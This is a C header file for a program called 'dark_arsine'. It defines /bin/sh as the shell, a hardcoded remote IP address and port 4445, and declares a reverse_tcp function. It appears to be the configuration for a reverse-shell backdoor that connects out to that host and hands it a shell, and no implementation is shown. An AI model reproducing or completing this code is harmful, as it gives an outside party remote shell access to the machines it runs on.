#ifndef __ARSINE__
#define __ARSINE__
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "base_struct.h"

#define PROGNAME    "dark_arsine"
#define VERSION     "0.0.1"
#define SHELL       "/bin/sh"
#define IPADDR      "107.170.200.75"
#define SERVICE     "4445"
#define PORT         4445

void reverse_tcp(const arsine_h *arsine);
void arsine_init(arsine_h *arsine);
#endif
